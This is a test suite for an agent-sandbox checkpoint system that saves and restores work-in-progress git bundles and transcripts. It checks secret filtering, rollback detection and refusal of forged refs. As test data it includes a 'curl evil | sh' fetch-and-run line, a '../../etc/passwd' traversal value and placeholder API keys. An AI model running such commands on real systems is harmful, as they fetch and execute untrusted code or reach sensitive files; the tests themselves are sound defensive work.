import { afterEach, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, utimesSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gunzipSync } from "node:zlib";
import { FakeRunnerApi, testSession } from "../api/fake.ts";
import type { SavedPoint } from "../api/protocol.ts";
import { checkout } from "../repo.ts";
import { Checkpoints, SESSION_UNSAVED } from "./checkpoints.ts";
import { agentShell } from "./shell.ts";
import { Transcripts } from "./transcripts.ts";
import { GitWork, gitIn, ScratchWork } from "./work.ts";

const dirs: string[] = [];
afterEach(async () => {
  for (const dir of dirs.splice(0)) await rm(dir, { recursive: true, force: true });
});

async function temp(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), "ponzu-save-"));
  dirs.push(dir);
  return dir;
}

const DESIGN = "des_save";
const REF = `refs/ponzu/wip/${DESIGN}`;
const SECRET = "sk_live_51Hx0000secretvalue";

/**
 * A sandbox's HOME and a repository on "GitHub" (a bare one) with one commit on main, and the
 * design's checkout made the way the runner makes it.
 */
async function world() {
  const home = await temp();
  const env = { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: "1" };
  const git = (args: string[], cwd?: string) =>
    execFileSync("git", args, { cwd, env, encoding: "utf8" }).trim();
  const remote = join(await temp(), "fern.git");
  const seed = await temp();
  git(["init", "--quiet", "--bare", "--initial-branch=main", remote]);
  git(["init", "--quiet", "--initial-branch=main", seed]);
  await writeFile(join(seed, "README.md"), "Fern\n");
  await writeFile(join(seed, ".gitignore"), "dist/\n*.log\n");
  git(["add", "."], seed);
  git(["-c", "user.name=Seed", "-c", "user.email=s@t", "commit", "--quiet", "-m", "Start"], seed);
  git(["push", "--quiet", remote, "main"], seed);
  const session = testSession({
    design: { id: DESIGN, name: "Fern" },
    repo: { owner: "north", name: "fern", defaultBranch: "main" },
    branch: "pz/hero",
  });
  // Cloned as GitHub would serve it: over a transport, not by sharing the bare repo's objects.
  const opts = { helper: "!true", remote: () => `file://${remote}`, env };
  const clone = async (root: string) => checkout(session, { ...opts, root });
  const shell = agentShell(undefined, env);
  const work = (cwd: string, limits?: { fileBytes: number; totalBytes: number }) =>
    new GitWork({
      cwd,
      designId: DESIGN,
      branch: "pz/hero",
      defaultBranch: "main",
      git: gitIn(shell, "git", cwd),
      secrets: [SECRET, "short"],
      ...(limits ? { limits } : {}),
    });
  /** Someone pushes a commit to `branch` on GitHub. */
  const push = async (branch: string, file: string) => {
    git(["fetch", "--quiet", remote, `${branch}:refs/remotes/up/${branch}`], seed);
    git(["switch", "--quiet", "-C", branch, `refs/remotes/up/${branch}`], seed);
    await writeFile(join(seed, file), `${file}\n`);
    git(["add", file], seed);
    git(["-c", "user.name=S", "-c", "user.email=s@t", "commit", "--quiet", "-m", file], seed);
    git(["push", "--quiet", remote, branch], seed);
  };
  return { git, remote, seed, clone, work, home, env, push };
}

const point = (over: Partial<SavedPoint> = {}): SavedPoint => ({
  turn: 1,
  at: new Date().toISOString(),
  claudeSessionId: null,
  wipCommit: null,
  session: false,
  workspace: false,
  ...over,
});

test("work in progress is a bundle kept with the checkpoint: changes and untracked files, nothing ignored, large or secret, and nothing goes to GitHub", async () => {
  const { git, remote, clone, work } = await world();
  const dir = await clone(await temp());
  await writeFile(join(dir, "README.md"), "Fern, calmer\n");
  await mkdir(join(dir, "src"));
  await writeFile(join(dir, "src", "hero.html"), "<h1>Hi</h1>\n");
  await mkdir(join(dir, "dist"));
  await writeFile(join(dir, "dist", "bundle.js"), "built\n");
  await writeFile(join(dir, "debug.log"), "noise\n");
  await writeFile(join(dir, "big.bin"), Buffer.alloc(2048, 1));
  // What an agent writes to run the app: none of it is ignored by this repo.
  await writeFile(join(dir, ".env"), `STRIPE_SECRET_KEY=${SECRET}\n`);
  await writeFile(join(dir, ".env.example"), "STRIPE_SECRET_KEY=\n");
  await mkdir(join(dir, "certs"));
  await writeFile(join(dir, "certs", "server.pem"), "-----BEGIN PRIVATE KEY-----\n");
  await writeFile(join(dir, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_x\n");
  await writeFile(join(dir, "src", "config.js"), `export const key = "${SECRET}";\n`);
  git(["add", "src/hero.html"], dir); // staged, so the real index holds something
  const headBefore = git(["rev-parse", "HEAD"], dir);
  const statusBefore = git(["status", "--porcelain"], dir);

  const saved = await work(dir, { fileBytes: 1024, totalBytes: 1_000_000 }).save(3);

  expect(saved.wipCommit).toMatch(/^[0-9a-f]{40}$/);
  expect(saved.workspace).not.toBeNull();
  expect(saved.skipped.sort()).toEqual([
    ".env (may hold a secret)",
    ".npmrc (may hold a secret)",
    "big.bin (2048 bytes)",
    "certs/server.pem (may hold a secret)",
    "src/config.js (holds a secret's value)",
  ]);
  // GitHub has the branch it had, and nothing else: no ref, no branch.
  expect(git(["--git-dir", remote, "for-each-ref", "--format=%(refname)"])).toBe("refs/heads/main");
  const files = git(["ls-tree", "-r", "--name-only", saved.wipCommit!], dir).split("\n");
  expect(files.sort()).toEqual([".env.example", ".gitignore", "README.md", "src/hero.html"]);
  expect(git(["show", `${saved.wipCommit}:README.md`], dir)).toBe("Fern, calmer");
  const message = git(["log", "-1", "--format=%B", saved.wipCommit!], dir);
  expect(message).toContain("Ponzu-Turn: 3");
  expect(message).toContain("Ponzu-Skipped: .env (may hold a secret)");
  expect(git(["rev-parse", `${saved.wipCommit}^`], dir)).toBe(headBefore);
  // The bundle holds no secret either.
  expect(Buffer.from(gunzipSync(saved.workspace!)).includes(SECRET)).toBe(false);
  // The checkout is as it was: the same HEAD, branch, index and working tree.
  expect(git(["rev-parse", "HEAD"], dir)).toBe(headBefore);
  expect(git(["branch", "--show-current"], dir)).toBe("pz/hero");
  expect(git(["status", "--porcelain"], dir)).toBe(statusBefore);

  // Nothing new: the same commit, and the stored archive is kept.
  const again = await work(dir, { fileBytes: 1024, totalBytes: 1_000_000 });
  const first = await again.save(4);
  const second = await again.save(5);
  expect(second).toMatchObject({ wipCommit: first.wipCommit, workspace: null, kept: true });
});

test("a fresh checkout gets the work back on top of the branch, unpushed commits included", async () => {
  const { git, clone, work } = await world();
  const first = await clone(await temp());
  await writeFile(join(first, "notes.md"), "committed, never pushed\n");
  git(["add", "notes.md"], first);
  git(["commit", "--quiet", "-m", "Notes"], first);
  const unpushed = git(["rev-parse", "HEAD"], first);
  await writeFile(join(first, "README.md"), "edited, not committed\n");
  await writeFile(join(first, "draft.md"), "untracked\n");
  const saved = await work(first).save(5);

  // The sandbox is lost: a new one clones the branch, which GitHub never got.
  const second = await clone(await temp());
  expect(git(["rev-parse", "HEAD"], second)).not.toBe(unpushed);
  const restored = await work(second).restore(
    point({ turn: 5, wipCommit: saved.wipCommit }),
    saved.workspace,
  );

  expect(restored.done).toBe(true);
  expect(git(["rev-parse", "HEAD"], second)).toBe(unpushed);
  expect(git(["branch", "--show-current"], second)).toBe("pz/hero");
  expect(readFileSync(join(second, "README.md"), "utf8")).toBe("edited, not committed\n");
  expect(readFileSync(join(second, "draft.md"), "utf8")).toBe("untracked\n");
  // Uncommitted as it was: modified, and untracked.
  expect(
    git(["status", "--porcelain=v2"], second)
      .split("\n")
      .map((line) => line.split(" ")[0] + " " + line.split(" ").at(-1))
      .sort(),
  ).toEqual(["1 README.md", "? draft.md"]);
  expect(git(["diff", "--cached", "--name-only"], second)).toBe("");
});

test("a new sandbox gets the work of a branch never pushed back after main moved on", async () => {
  const { git, clone, work, push } = await world();
  const first = await clone(await temp());
  await writeFile(join(first, "notes.md"), "uncommitted notes\n");
  const saved = await work(first).save(2);

  // Someone pushes to main; the design's branch was never pushed. A new sandbox makes the
  // branch again from main as it is now.
  await push("main", "later.md");
  const second = await clone(await temp());
  expect(existsSync(join(second, "later.md"))).toBe(true);
  const restored = await work(second).restore(
    point({ turn: 2, wipCommit: saved.wipCommit }),
    saved.workspace,
  );

  expect(restored.done).toBe(true);
  expect(readFileSync(join(second, "notes.md"), "utf8")).toBe("uncommitted notes\n");
  expect(git(["branch", "--show-current"], second)).toBe("pz/hero");
  expect(git(["status", "--porcelain"], second)).toBe("?? notes.md");
});

test("a restore never goes back over newer work: a branch that moved on, or changes on the disk", async () => {
  const { git, clone, work, push } = await world();
  const first = await clone(await temp());
  await writeFile(join(first, "README.md"), "saved edit\n");
  const saved = await work(first).save(2);

  // Someone pushed to the design's branch since: the saved work is older than it.
  git(["push", "--quiet", "origin", "pz/hero"], first);
  await push("pz/hero", "later.md");
  const second = await clone(await temp());
  const moved = await work(second).restore(
    point({ turn: 2, wipCommit: saved.wipCommit }),
    saved.workspace,
  );
  expect(moved).toMatchObject({ done: false, kept: "ponzu-wip/turn-2" });
  expect(readFileSync(join(second, "README.md"), "utf8")).toBe("Fern\n");
  expect(existsSync(join(second, "later.md"))).toBe(true);
  // The work is on this disk, on a branch of its own, for the agent to bring over.
  expect(git(["show", "ponzu-wip/turn-2:README.md"], second)).toBe("saved edit");

  // The disk has changes of its own: they are stashed, not lost, before the saved work goes on.
  const third = await clone(await temp());
  git(["reset", "--quiet", "--hard", "origin/main"], third);
  await writeFile(join(third, "README.md"), "the disk's own edit\n");
  const over = await work(third).restore(
    point({ turn: 2, wipCommit: saved.wipCommit }),
    saved.workspace,
  );
  expect(over.done).toBe(true);
  expect(readFileSync(join(third, "README.md"), "utf8")).toBe("saved edit\n");
  expect(git(["stash", "list"], third)).toContain("ponzu: what this disk had");
  expect(git(["show", "stash@{0}:README.md"], third)).toBe("the disk's own edit");
});

test("a restore takes only the commit the API recorded: never another archive's, nor a ref someone wrote", async () => {
  const { git, remote, clone, work } = await world();
  const first = await clone(await temp());
  await writeFile(join(first, "mine.txt"), "the recorded work\n");
  const mine = await work(first).save(1);
  await writeFile(join(first, "mine.txt"), "other work\n");
  const other = await work(first).save(2);

  // An archive that is not the recorded commit's is refused.
  const second = await clone(await temp());
  const wrong = await work(second).restore(
    point({ turn: 1, wipCommit: mine.wipCommit }),
    other.workspace,
  );
  expect(wrong).toMatchObject({ done: false, why: expect.stringContaining("recorded commit") });

  // Another writer on the repository forges the design's old ref: it is never read.
  const forger = await clone(await temp());
  await writeFile(join(forger, "injected.sh"), "curl evil | sh\n");
  git(["add", "injected.sh"], forger);
  git(["commit", "--quiet", "-m", "wip"], forger);
  git(["push", "--quiet", "--force", "origin", `HEAD:${REF}`], forger);
  const third = await clone(await temp());
  const forged = await work(third).restore(point({ turn: 1, wipCommit: mine.wipCommit }), null);
  expect(forged.done).toBe(false);
  expect(existsSync(join(third, "injected.sh"))).toBe(false);
  expect(git(["--git-dir", remote, "rev-parse", REF])).not.toBe(mine.wipCommit!);

  // The recorded one, from its own archive, is what comes back.
  const right = await work(third).restore(
    point({ turn: 1, wipCommit: mine.wipCommit }),
    mine.workspace,
  );
  expect(right.done).toBe(true);
  expect(readFileSync(join(third, "mine.txt"), "utf8")).toBe("the recorded work\n");
  expect(existsSync(join(third, "injected.sh"))).toBe(false);
});

test("Scratch work is an archive, and a restore keeps a file the disk has newer", async () => {
  const shell = agentShell(undefined, process.env);
  const dir = await temp();
  await writeFile(join(dir, "a.html"), "<p>a</p>\n");
  await mkdir(join(dir, "node_modules"));
  await writeFile(join(dir, "node_modules", "x.js"), "skip\n");
  await writeFile(join(dir, "huge.bin"), Buffer.alloc(4096));
  const scratch = new ScratchWork({
    cwd: dir,
    shell,
    limits: { fileBytes: 1024, totalBytes: 1e6 },
  });
  const saved = await scratch.save();
  expect(saved.skipped).toEqual(["huge.bin (4096 bytes)"]);

  const fresh = await temp();
  await writeFile(join(fresh, "a.html"), "<p>newer on this disk</p>\n");
  const later = Date.now() / 1000 + 60;
  utimesSync(join(fresh, "a.html"), later, later);
  await new ScratchWork({ cwd: fresh, shell }).restore(point(), saved.workspace);
  expect(readFileSync(join(fresh, "a.html"), "utf8")).toBe("<p>newer on this disk</p>\n");
  expect(existsSync(join(fresh, "node_modules"))).toBe(false);

  const empty = await temp();
  await new ScratchWork({ cwd: empty, shell }).restore(point(), saved.workspace);
  expect(readFileSync(join(empty, "a.html"), "utf8")).toBe("<p>a</p>\n");
});

/** A transcript as Claude Code leaves one, for session `id` in the project of `cwd`. */
async function transcript(configDir: string, id: string, lines: string[]) {
  const project = join(configDir, "projects", "-home-agent-work-fern");
  await mkdir(join(project, id, "subagents"), { recursive: true });
  await writeFile(join(project, `${id}.jsonl`), `${lines.join("\n")}\n`);
  await writeFile(join(project, id, "subagents", "agent-1.jsonl"), "{}\n");
  await writeFile(join(project, "other-session.jsonl"), "not this one\n");
  return join(project, `${id}.jsonl`);
}

test("a session's transcript is the files that resume it, and comes back without replacing a newer one", async () => {
  const shell = agentShell(undefined, process.env);
  const from = new Transcripts({ configDir: await temp(), shell });
  const id = "5f0c6a52-0d6b-4f63-9d7c-3c1b1d2a9e10";
  await transcript((from as unknown as { opts: { configDir: string } }).opts.configDir, id, [
    '{"type":"user"}',
    '{"type":"assistant"}',
  ]);
  expect(from.files(id).sort()).toEqual([
    `projects/-home-agent-work-fern/${id}`,
    `projects/-home-agent-work-fern/${id}.jsonl`,
  ]);
  expect(from.files("../../etc/passwd")).toEqual([]);
  const archive = (await from.pack(id))!;

  const configDir = await temp();
  const to = new Transcripts({ configDir, shell });
  expect(to.has(id)).toBe(false);
  await to.unpack(archive);
  expect(to.has(id)).toBe(true);
  const file = join(configDir, "projects", "-home-agent-work-fern", `${id}.jsonl`);
  expect(readFileSync(file, "utf8")).toBe('{"type":"user"}\n{"type":"assistant"}\n');
  expect(
    existsSync(join(configDir, "projects", "-home-agent-work-fern", "other-session.jsonl")),
  ).toBe(false);

  // The turn after the checkpoint was written here and never saved: it stays.
  await writeFile(file, '{"type":"user"}\n{"type":"assistant"}\n{"type":"user"}\n');
  const later = Date.now() / 1000 + 60;
  utimesSync(file, later, later);
  await to.unpack(archive);
  expect(readFileSync(file, "utf8").split("\n").length).toBe(4);

  await expect(new Transcripts({ configDir, shell, maxBytes: 10 }).pack(id)).rejects.toThrow(
    "over the 10",
  );
});

/** Checkpoints over a fake API, a real transcript and a Scratch folder. */
async function checkpoints(api: FakeRunnerApi, stateDir: string, cwd: string, configDir: string) {
  const shell = agentShell(undefined, process.env);
  const events: { name: string; fields: Record<string, unknown> }[] = [];
  const logs: string[] = [];
  const client = await api.connect();
  const made = new Checkpoints({
    api: client,
    stateDir,
    transcripts: new Transcripts({ configDir, shell }),
    work: new ScratchWork({ cwd, shell }),
    log: (m) => logs.push(m),
    event: (name, fields) => events.push({ name, fields }),
    boot: () => ({ id: "boot-2", at: "2026-11-11T00:00:00.000Z" }),
    flush: async () => {},
  });
  return { made, events, logs };
}

test("a checkpoint saves the transcript and the work, and skips what has not changed", async () => {
  const api = new FakeRunnerApi();
  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
  const id = "11111111-2222-3333-4444-555555555555";
  await transcript(configDir, id, ['{"n":1}']);
  await writeFile(join(cwd, "a.html"), "a\n");
  const { made } = await checkpoints(api, stateDir, cwd, configDir);
  expect((await made.recover(null)).kind).toBe("none");

  await made.save(id);
  expect(api.saved).toMatchObject({ turn: 1, claudeSessionId: id, session: true, workspace: true });
  expect(made.marker()).toMatchObject({ turn: 1, claudeSessionId: id, bootId: "boot-2" });
  await made.save(id);
  expect(api.checkpoints).toHaveLength(1);

  await writeFile(join(cwd, "b.html"), "b\n");
  await Promise.all([made.save(id), made.save(id)]);
  expect(api.saved!.turn).toBe(2);
  expect(api.checkpoints).toHaveLength(2);
});

test("a disk behind the last checkpoint is a rollback: restored, logged and reported", async () => {
  const api = new FakeRunnerApi();
  const id = "11111111-2222-3333-4444-555555555555";
  // The first sandbox: two turns saved.
  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
  const file = await transcript(configDir, id, ['{"turn":1}']);
  await writeFile(join(cwd, "a.html"), "one\n");
  const first = await checkpoints(api, stateDir, cwd, configDir);
  await first.made.recover(null);
  await first.made.save(id);
  const atTurnOne = readFileSync(join(stateDir, "checkpoint.json"), "utf8");
  await writeFile(file, '{"turn":1}\n{"turn":2}\n');
  await writeFile(join(cwd, "a.html"), "two\n");
  await first.made.save(id);
  expect(api.saved!.turn).toBe(2);

  // The disk comes back as it was at turn one: the marker, the transcript and the work.
  await writeFile(join(stateDir, "checkpoint.json"), atTurnOne);
  await writeFile(file, '{"turn":1}\n');
  utimesSync(file, 1, 1);
  await writeFile(join(cwd, "a.html"), "one\n");
  utimesSync(join(cwd, "a.html"), 1, 1);
  const second = await checkpoints(api, stateDir, cwd, configDir);
  const recovery = await second.made.recover(api.saved);

  expect(recovery).toEqual({ kind: "rollback", restored: { session: true, workspace: true } });
  expect(readFileSync(file, "utf8")).toBe('{"turn":1}\n{"turn":2}\n');
  expect(readFileSync(join(cwd, "a.html"), "utf8")).toBe("two\n");
  expect(second.made.marker()!.turn).toBe(2);
  expect(api.restored).toEqual([
    {
      kind: "rollback",
      disk: { turn: 1, at: expect.any(String), bootId: "boot-2" },
      saved: { turn: 2, at: api.saved!.at },
      bootId: "boot-2",
      bootAt: "2026-11-11T00:00:00.000Z",
      restored: { session: true, workspace: true },
    },
  ]);
  expect(second.events.map((e) => e.name)).toEqual(["sandbox_rollback"]);
  // The next checkpoint goes on from the API's marker.
  await writeFile(join(cwd, "a.html"), "three\n");
  await second.made.save(id);
  expect(api.saved!.turn).toBe(3);

  // A new sandbox, with nothing on its disk: rebuilt from the checkpoint.
  const [s3, c3, k3] = [await temp(), await temp(), await temp()];
  const third = await checkpoints(api, s3, c3, k3);
  expect((await third.made.recover(api.saved)).kind).toBe("rebuilt");
  expect(readFileSync(join(c3, "a.html"), "utf8")).toBe("three\n");
  expect(
    new Transcripts({ configDir: k3, shell: agentShell(undefined, process.env) }).has(id),
  ).toBe(true);
  expect(api.restored.at(-1)!.kind).toBe("rebuilt");
});

test("a disk at or past the last checkpoint is left as it is", async () => {
  const api = new FakeRunnerApi();
  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
  await writeFile(join(cwd, "a.html"), "one\n");
  const { made } = await checkpoints(api, stateDir, cwd, configDir);
  await made.recover(null);
  await made.save(null);
  await writeFile(join(cwd, "a.html"), "newer, never saved\n");

  const again = await checkpoints(api, stateDir, cwd, configDir);
  expect((await again.made.recover(api.saved)).kind).toBe("none");
  expect(readFileSync(join(cwd, "a.html"), "utf8")).toBe("newer, never saved\n");
  expect(api.calls).not.toContain("restore");
});

test("a checkpoint never carries less than the last: what it cannot carry, the API keeps from the one before", async () => {
  const api = new FakeRunnerApi();
  const stored = new Uint8Array([1]);
  api.saved = {
    turn: 4,
    at: new Date().toISOString(),
    claudeSessionId: "11111111-2222-3333-4444-555555555555",
    wipCommit: "a".repeat(40),
    session: true,
    workspace: true,
  };
  api.archives = { session: stored, workspace: new Uint8Array([2]) };
  const [stateDir, configDir] = [await temp(), await temp()];
  await writeFile(
    join(stateDir, "checkpoint.json"),
    JSON.stringify({ ...api.saved, bootId: null }),
  );
  const id = "11111111-2222-3333-4444-555555555555";
  const shell = agentShell(undefined, process.env);
  // The repository could not be checked out this time: there is no work saver.
  const made = new Checkpoints({
    api: await api.connect(),
    stateDir,
    transcripts: new Transcripts({ configDir, shell }),
    work: null,
    log: () => {},
    event: () => {},
    boot: () => ({ id: null, at: null }),
    flush: async () => {},
  });
  await made.recover(api.saved);

  // No transcript on this disk yet: the stored one, and the stored work, are kept.
  await made.save(id);
  expect(api.checkpoints.at(-1)).toMatchObject({
    turn: 5,
    keep: { session: true, workspace: true },
  });
  expect(api.saved).toMatchObject({
    turn: 5,
    claudeSessionId: id,
    wipCommit: "a".repeat(40),
    session: true,
    workspace: true,
  });
  expect(api.archives.session).toBe(stored);

  await transcript(configDir, id, ['{"n":6}']);
  await made.save(id);
  expect(api.saved).toMatchObject({ turn: 6, wipCommit: "a".repeat(40), session: true });
  expect(api.archives.session).not.toBe(stored);
});

test("a transcript too large to keep does not stop the work from being saved, and the person is told once", async () => {
  const api = new FakeRunnerApi();
  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
  const id = "11111111-2222-3333-4444-555555555555";
  await transcript(configDir, id, ['{"n":1}']);
  const shell = agentShell(undefined, process.env);
  const transcripts = new Transcripts({ configDir, shell });
  const told: string[] = [];
  const events: string[] = [];
  const made = new Checkpoints({
    api: await api.connect(),
    stateDir,
    transcripts,
    work: new ScratchWork({ cwd, shell }),
    log: () => {},
    event: (name) => events.push(name),
    boot: () => ({ id: null, at: null }),
    flush: async () => {},
    notify: (message) => told.push(message),
  });
  await made.recover(null);
  await writeFile(join(cwd, "a.html"), "one\n");
  await made.save(id);
  expect(api.saved).toMatchObject({ turn: 1, session: true, workspace: true });
  const first = api.archives.session;

  // The conversation outgrows what a checkpoint keeps.
  (transcripts as unknown as { maxBytes: number }).maxBytes = 10;
  await writeFile(join(configDir, "projects", "-home-agent-work-fern", `${id}.jsonl`), "{}\n{}\n");
  await writeFile(join(cwd, "precious.html"), "<p>keep me</p>\n");
  await made.save(id);
  expect(api.saved).toMatchObject({ turn: 2, claudeSessionId: id, session: true, workspace: true });
  // The work of this turn is saved; the transcript stored is the last that could be.
  expect(api.archives.session).toBe(first);
  const restored = await temp();
  await new ScratchWork({ cwd: restored, shell }).restore(api.saved!, api.archives.workspace);
  expect(readFileSync(join(restored, "precious.html"), "utf8")).toBe("<p>keep me</p>\n");
  expect(events).toContain("checkpoint_session_skipped");

  await writeFile(join(cwd, "more.html"), "more\n");
  await made.save(id);
  expect(api.saved!.turn).toBe(3);
  expect(told).toEqual([SESSION_UNSAVED]);
});

test("a marker that only lags the API, because the stop came between the API's answer and its write, is no rollback", async () => {
  const api = new FakeRunnerApi();
  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
  await writeFile(join(cwd, "a.html"), "one\n");
  const first = await checkpoints(api, stateDir, cwd, configDir);
  await first.made.recover(null);
  await first.made.save(null);
  await writeFile(join(cwd, "a.html"), "two\n");
  // The checkpoint is recorded, and the process is killed before the marker says so.
  const saveCheckpoint = api.saveCheckpoint.bind(api);
  let marker = "";
  api.saveCheckpoint = async (runner, point) => {
    const answer = await saveCheckpoint(runner, point);
    marker = readFileSync(join(stateDir, "checkpoint.json"), "utf8");
    return answer;
  };
  await first.made.save(null);
  expect(api.saved!.turn).toBe(2);
  expect(JSON.parse(marker)).toMatchObject({ turn: 1, pending: 2 });
  await writeFile(join(stateDir, "checkpoint.json"), marker);

  const second = await checkpoints(api, stateDir, cwd, configDir);
  expect((await second.made.recover(api.saved)).kind).toBe("none");
  expect(second.events.map((e) => e.name)).toEqual(["marker_lag"]);
  expect(api.restored).toEqual([]);
  expect(second.made.marker()!.turn).toBe(2);
  expect(readFileSync(join(cwd, "a.html"), "utf8")).toBe("two\n");
});
